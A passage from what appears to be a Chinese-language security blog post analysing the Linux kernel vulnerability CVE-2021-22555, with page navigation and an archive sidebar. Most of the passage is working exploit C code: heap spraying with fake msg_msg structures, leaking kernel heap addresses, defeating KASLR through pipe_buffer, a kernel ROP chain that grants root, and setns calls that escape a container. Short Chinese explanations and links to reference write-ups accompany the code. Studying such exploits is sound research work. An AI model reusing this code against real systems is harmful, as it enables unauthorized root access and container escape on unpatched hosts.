<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Reclaim the previously freed secondary message with a fake msg_msg of</span><br><span class="line">&#x2F;&#x2F; maximum possible size.</span><br><span class="line">printf(&quot;[*] Spraying fake secondary messages...\n&quot;);</span><br><span class="line">memset(secondary_buf, 0, sizeof(secondary_buf));</span><br><span class="line">build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,</span><br><span class="line">              PAGE_SIZE - MSG_MSG_SIZE, 0);</span><br><span class="line">if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line">  </span><br><span class="line">void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,</span><br><span class="line">                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) &#123;</span><br><span class="line">  msg-&gt;m_list_next &#x3D; m_list_next;</span><br><span class="line">  msg-&gt;m_list_prev &#x3D; m_list_prev;</span><br><span class="line">  msg-&gt;m_type &#x3D; MTYPE_FAKE;</span><br><span class="line">  msg-&gt;m_ts &#x3D; m_ts;</span><br><span class="line">  msg-&gt;next &#x3D; next;</span><br><span class="line">  msg-&gt;security &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) &#123;</span><br><span class="line">  for (int i &#x3D; 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    for (int j &#x3D; 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      if (write(ss[i][0], buf, size) &lt; 0) &#123;</span><br><span class="line">        perror(&quot;[-] write&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-2-越界读取相邻次要消息"><a href="#3-2-2-越界读取相邻次要消息" class="headerlink" title="3.2.2 越界读取相邻次要消息"></a>3.2.2 越界读取相邻次要消息</h4><p>由于构造的伪次要消息的m_ts字段要远大于真实次要消息内容长度，通过读取该消息可以越界读取相邻次要消息的头部内容，包括next指针，这样就获得了该next指针所指向的主要消息的地址（消息队列是双向链表）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Use the fake secondary message to read out-of-bounds.</span><br><span class="line">printf(&quot;[*] Leaking adjacent secondary message...\n&quot;);</span><br><span class="line">if (peek_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), 1) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Check if the leak is valid.</span><br><span class="line">if (*(int *)&amp;msg_fake.mtext[SECONDARY_SIZE] !&#x3D; MSG_TAG) &#123;</span><br><span class="line">  printf(&quot;[-] Error could not leak adjacent secondary message.\n&quot;);</span><br><span class="line">  goto err_rmid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The secondary message contains a pointer to the primary message.</span><br><span class="line">msg &#x3D; (struct msg_msg *)&amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">kheap_addr &#x3D; msg-&gt;m_list_next;</span><br><span class="line">if (kheap_addr &amp; (PRIMARY_SIZE - 1))</span><br><span class="line">  kheap_addr &#x3D; msg-&gt;m_list_prev;</span><br><span class="line">printf(&quot;[+] kheap_addr: %&quot; PRIx64 &quot;\n&quot;, kheap_addr);</span><br></pre></td></tr></table></figure>

<h4 id="3-2-3-再次构造伪次要消息"><a href="#3-2-3-再次构造伪次要消息" class="headerlink" title="3.2.3 再次构造伪次要消息"></a>3.2.3 再次构造伪次要消息</h4><p>获得了相邻次要消息所指向的主要消息的地址后，通过read函数读取socket内容的方式释放伪次要消息，让关键缓冲区再次进入被释放状态。然后，以相同的方式重新构造伪次要消息，这次构造的m_ts字段要大于消息分片的阈值，next字段等于相邻次要消息所指向的主要消息的地址-结构msg_msgseg的长度，这样做相当于将该主要消息伪造成下一个消息片段，那么在读取伪次要消息时，就可以读取该主要消息的next指针，该指针指向相邻次要消息，将指针内容减去1024即可获得伪次要消息即关键缓冲区的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Put kheap_addr at next to leak its content. Assumes zero bytes before</span><br><span class="line">&#x2F;&#x2F; kheap_addr.</span><br><span class="line">printf(&quot;[*] Spraying fake secondary messages...\n&quot;);</span><br><span class="line">memset(secondary_buf, 0, sizeof(secondary_buf));</span><br><span class="line">build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,</span><br><span class="line">              sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);</span><br><span class="line">if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Use the fake secondary message to read from kheap_addr.</span><br><span class="line">printf(&quot;[*] Leaking primary message...\n&quot;);</span><br><span class="line">if (peek_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), 1) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Check if the leak is valid.</span><br><span class="line">if (*(int *)&amp;msg_fake.mtext[PAGE_SIZE] !&#x3D; MSG_TAG) &#123;</span><br><span class="line">  printf(&quot;[-] Error could not leak primary message.\n&quot;);</span><br><span class="line">  goto err_rmid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The primary message contains a pointer to the secondary message.</span><br><span class="line">msg &#x3D; (struct msg_msg *)&amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];</span><br><span class="line">kheap_addr &#x3D; msg-&gt;m_list_next;</span><br><span class="line">if (kheap_addr &amp; (SECONDARY_SIZE - 1))</span><br><span class="line">  kheap_addr &#x3D; msg-&gt;m_list_prev;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Calculate the address of the fake secondary message.</span><br><span class="line">kheap_addr -&#x3D; SECONDARY_SIZE;</span><br><span class="line">printf(&quot;[+] kheap_addr: %&quot; PRIx64 &quot;\n&quot;, kheap_addr);</span><br></pre></td></tr></table></figure>

<h3 id="3-3-绕过KASLR-SMEP"><a href="#3-3-绕过KASLR-SMEP" class="headerlink" title="3.3 绕过KASLR/SMEP"></a>3.3 绕过KASLR/SMEP</h3><p>接下来将通过泄露内核.data段的地址来绕过KASLR，并通过利用内核gadget构造ROP链来绕过SMEP。</p>
<h4 id="3-3-1-释放伪次要消息"><a href="#3-3-1-释放伪次要消息" class="headerlink" title="3.3.1 释放伪次要消息"></a>3.3.1 释放伪次要消息</h4><p>前面构造的伪次要消息的内容是通过socket写入的，那么内核肯定有一个跟socket相关的结构体是指向伪次要消息缓冲区的，事实上该结构体为sk_buff。</p>
<p><img src="/2021/12/27/CVE-2021-22555/7.png" alt></p>
<p>由于结构体msg_msg占据了消息缓冲区前面部分，msgrcv不能完全读取缓冲区的内容，而通过socket则相反。因此，需要通过msgrcv将关键缓冲区释放，后面通过socket读取关键缓冲区的内容。</p>
<p>由于之前构造的伪次要消息的next和prev指针不是有效的地址，现阶段不能直接通过msgrcv释放该伪次要消息，因为内核会检查消息队列链表的完整性。</p>
<p>为了能通过msgrcv释放伪次要消息，需要依次执行以下步骤：</p>
<ol>
<li>通过读取socket释放关键缓冲区。</li>
<li>通过写入socket再次申请关键缓冲区，写入内容为重新构造的伪次要消息，其next和prev指针为自身地址，这样就能绕过链表完整性检查。</li>
<li>通过msgrcv释放伪次要消息。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Freeing fake secondary messages...\n&quot;);</span><br><span class="line">free_skbuff(ss, secondary_buf, sizeof(secondary_buf));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Put kheap_addr at m_list_next &amp; m_list_prev so that list_del() is possible.</span><br><span class="line">printf(&quot;[*] Spraying fake secondary messages...\n&quot;);</span><br><span class="line">memset(secondary_buf, 0, sizeof(secondary_buf));</span><br><span class="line">build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);</span><br><span class="line">if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">printf(&quot;[*] Freeing sk_buff data buffer...\n&quot;);</span><br><span class="line">if (read_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), MTYPE_FAKE) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br></pre></td></tr></table></figure>

<h4 id="3-3-2-泄露内核地址"><a href="#3-3-2-泄露内核地址" class="headerlink" title="3.3.2 泄露内核地址"></a>3.3.2 泄露内核地址</h4><p>上一步执行完后，还有sk_buff指向关键缓冲区，那么，如果在关键缓冲区填入包含指向内核.data段指针的数据结构，再通过读取socket来获得缓冲区的完整内容，就可以获得内核.data段的地址，进而计算出.text段的地址，让利用内核gadget成为可能。</p>
<p><img src="/2021/12/27/CVE-2021-22555/8.png" alt></p>
<p>结构体pipe_buffer是个很好的目标，其定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;git.kernel.org&#x2F;pub&#x2F;scm&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;tree&#x2F;include&#x2F;linux&#x2F;pipe_fs_i.h</span><br><span class="line">struct pipe_buffer &#123;</span><br><span class="line">	struct page *page;</span><br><span class="line">	unsigned int offset, len;</span><br><span class="line">	const struct pipe_buf_operations *ops;</span><br><span class="line">	unsigned int flags;</span><br><span class="line">	unsigned long private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct pipe_buf_operations &#123;</span><br><span class="line">	...</span><br><span class="line">	&#x2F;*</span><br><span class="line">	 * When the contents of this pipe buffer has been completely</span><br><span class="line">	 * consumed by a reader, -&gt;release() is called.</span><br><span class="line">	 *&#x2F;</span><br><span class="line">	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>pipe_buffer的成员ops指向一个位于内核.data段的数据结构anon_pipe_buf_ops，它将是接下来的泄露目标。</p>
<p>而且，ops指向的数据结构包含很多跟管道操作相关的函数指针，其中一个是release，它所指向的函数将在释放管道时被调用。那么，通过篡改ops指向伪造的pipe_buf_operations结构，在释放管道时就可以劫持控制流。</p>
<p>为泄露内核.data段的地址，将进行以下步骤：</p>
<ol>
<li>通过向多个管道写入数据让内核构造多个pipe_buffer结构体的实例，其中一个实例将占据关键缓冲区。此时内存布局如下：</li>
</ol>
<p><img src="/2021/12/27/CVE-2021-22555/9.png" alt></p>
<ol start="2">
<li>读取socket，获得anon_pipe_buf_ops的地址，也就是获得了内核.data段地址。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Spraying pipe_buffer objects...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">  if (pipe(pipefd[i]) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] pipe&quot;);</span><br><span class="line">    goto err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F; Write something to populate pipe_buffer.</span><br><span class="line">  if (write(pipefd[i][1], &quot;pwn&quot;, 3) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] write&quot;);</span><br><span class="line">    goto err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(&quot;[*] Leaking and freeing pipe_buffer object...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">  for (int j &#x3D; 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">    if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) &lt; 0) &#123;</span><br><span class="line">      perror(&quot;[-] read&quot;);</span><br><span class="line">      goto err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    if (*(uint64_t *)&amp;secondary_buf[0x10] !&#x3D; MTYPE_FAKE)</span><br><span class="line">      pipe_buffer_ops &#x3D; *(uint64_t *)&amp;secondary_buf[0x10];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kbase_addr &#x3D; pipe_buffer_ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">printf(&quot;[+] anon_pipe_buf_ops: %&quot; PRIx64 &quot;\n&quot;, pipe_buffer_ops);</span><br><span class="line">printf(&quot;[+] kbase_addr: %&quot; PRIx64 &quot;\n&quot;, kbase_addr);</span><br></pre></td></tr></table></figure>

<p>此时关键缓冲区已被释放，内存布局如下：</p>
<p><img src="/2021/12/27/CVE-2021-22555/10.png" alt></p>
<h3 id="3-4-提权和容器逃逸"><a href="#3-4-提权和容器逃逸" class="headerlink" title="3.4 提权和容器逃逸"></a>3.4 提权和容器逃逸</h3><p>先通过写入socket构造伪pipe_buffer，让ops指针指向在关键缓冲区伪造的pipe_buf_operations，其中的release指针指向跟栈迁移相关的内核.text段的gadget。</p>
<p><img src="/2021/12/27/CVE-2021-22555/11.png" alt></p>
<p>同时，在关键缓冲区构造ROP链依序执行以下任务：</p>
<ol>
<li>保存RBP。</li>
<li>执行commit_creds(prepare_kernel_cred(NULL))，这一步是为了获得root权限。</li>
<li>执行switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)，这一步在容器环境中才有用，否则只是冗余步骤，作用是pid为1的进程的名称空间替换为容器初始化时的全局名称空间init_nsproxy，init_nsproxy名称空间可以访问宿主机的文件系统。</li>
<li>恢复RBP并恢复正常执行流程。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Spraying fake pipe_buffer objects...\n&quot;);</span><br><span class="line">memset(secondary_buf, 0, sizeof(secondary_buf));</span><br><span class="line">buf &#x3D; (struct pipe_buffer *)&amp;secondary_buf;</span><br><span class="line">buf-&gt;ops &#x3D; kheap_addr + 0x290;</span><br><span class="line">ops &#x3D; (struct pipe_buf_operations *)&amp;secondary_buf[0x290];</span><br><span class="line">&#x2F;&#x2F; RSI points to &amp;buf.</span><br><span class="line">ops-&gt;release &#x3D; kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;</span><br><span class="line">build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);</span><br><span class="line">if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line">  </span><br><span class="line">void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) &#123;</span><br><span class="line">  uint64_t *rop;</span><br><span class="line"></span><br><span class="line">  *(uint64_t *)&amp;buf[0x39] &#x3D; kbase_addr + POP_RSP_RET;</span><br><span class="line">  *(uint64_t *)&amp;buf[0x00] &#x3D; kbase_addr + ADD_RSP_D0_RET;</span><br><span class="line"></span><br><span class="line">  rop &#x3D; (uint64_t *)&amp;buf[0xD8];</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Save RBP at scratchpad_addr.</span><br><span class="line">  *rop++ &#x3D; kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; scratchpad_addr; &#x2F;&#x2F; R12</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF;      &#x2F;&#x2F; RBP</span><br><span class="line">  *rop++ &#x3D; kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; RBX</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; R12</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; RBP</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; commit_creds(prepare_kernel_cred(NULL))</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RDI_RET;</span><br><span class="line">  *rop++ &#x3D; 0; &#x2F;&#x2F; RDI</span><br><span class="line">  *rop++ &#x3D; kbase_addr + PREPARE_KERNEL_CRED;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RCX_RET;</span><br><span class="line">  *rop++ &#x3D; 4; &#x2F;&#x2F; RCX</span><br><span class="line">  *rop++ &#x3D; kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; RBP</span><br><span class="line">  *rop++ &#x3D; kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + COMMIT_CREDS;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RDI_RET;</span><br><span class="line">  *rop++ &#x3D; 1; &#x2F;&#x2F; RDI</span><br><span class="line">  *rop++ &#x3D; kbase_addr + FIND_TASK_BY_VPID;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RCX_RET;</span><br><span class="line">  *rop++ &#x3D; 4; &#x2F;&#x2F; RCX</span><br><span class="line">  *rop++ &#x3D; kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; RBP</span><br><span class="line">  *rop++ &#x3D; kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RSI_RET;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + INIT_NSPROXY; &#x2F;&#x2F; RSI</span><br><span class="line">  *rop++ &#x3D; kbase_addr + SWITCH_TASK_NAMESPACES;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Load RBP from scratchpad_addr and resume execution.</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; scratchpad_addr - 0xA; &#x2F;&#x2F; RBP</span><br><span class="line">  *rop++ &#x3D; kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + MOV_RSP_RBP_POP_RBP_RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>释放管道，执行release所指向的gadget，将内核栈迁移到关键缓冲区构造的ROP链处，然后执行完整个ROP链，实现提权。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Releasing pipe_buffer objects...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">  if (close(pipefd[i][0]) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] close&quot;);</span><br><span class="line">    goto err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">  if (close(pipefd[i][1]) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] close&quot;);</span><br><span class="line">    goto err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，将当前进程的名称空间替换成1号进程的，而1号进程的名称空间已经替换成容器初始化时的全局名称空间init_nsproxy，由此实现容器逃逸。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setns(open(&quot;&#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt&quot;, O_RDONLY), 0);</span><br><span class="line">setns(open(&quot;&#x2F;proc&#x2F;1&#x2F;ns&#x2F;pid&quot;, O_RDONLY), 0);</span><br><span class="line">setns(open(&quot;&#x2F;proc&#x2F;1&#x2F;ns&#x2F;net&quot;, O_RDONLY), 0);</span><br></pre></td></tr></table></figure>



<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md" target="_blank" rel="noopener">CVE-2021-22555: Turning \x00\x00 into 10000$</a></p>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22555" target="_blank" rel="noopener"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22555" target="_blank" rel="noopener">CVE-2021-22555 - The MITRE Corporation</a></a></p>
<p><a href="https://www.anquanke.com/post/id/247830" target="_blank" rel="noopener">CVE-2021-22555 linux内核提权</a></p>
<p><a href="https://www.anquanke.com/post/id/251515" target="_blank" rel="noopener">隐藏十五年的漏洞：CVE-2021-22555 漏洞分析与复现</a></p>
<p><a href="https://www.anquanke.com/post/id/254027" target="_blank" rel="noopener">CVE-2021-22555 2字节堆溢出写0漏洞提权分析</a></p>
<p><a href="https://man7.org/linux/man-pages/man7/namespaces.7.html" target="_blank" rel="noopener">namespaces(7) — Linux manual page</a></p>
<p><a href="https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation" target="_blank" rel="noopener">The Route to Root: Container Escape Using Kernel Exploitation</a></p>
<p><a href="https://duasynt.com/blog/linux-kernel-heap-spray" target="_blank" rel="noopener">Linux Kernel universal heap spray</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/12/27/CVE-2021-22555/" data-id="cmd5slr2g000i0lo13lu55i25" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="../../../../2022/02/10/CVE-2021-4034/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          CVE-2021-4034 pkexec 本地提权漏洞利用解析
        
      </div>
    </a>
  
  
    <a href="../../../09/24/LoongArch/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">LoongArch 研究小记（一）</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2023/03/">三月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/12/">十二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/04/">四月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/10/">十月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="../../../../2023/03/10/race_windown/">Linux 内核利用技巧 Racing against the clock</a>
          </li>
        
          <li>
            <a href="../../../../2023/02/06/cve-2022-1015/">CVE-2022-1015 nf_tables 提权漏洞分析</a>
          </li>
        
          <li>
            <a href="../../../../2023/02/01/slabUaf-to-pageUaf/">Linux 内核利用技巧 Slab UAF to Page UAF</a>
          </li>
        
          <li>
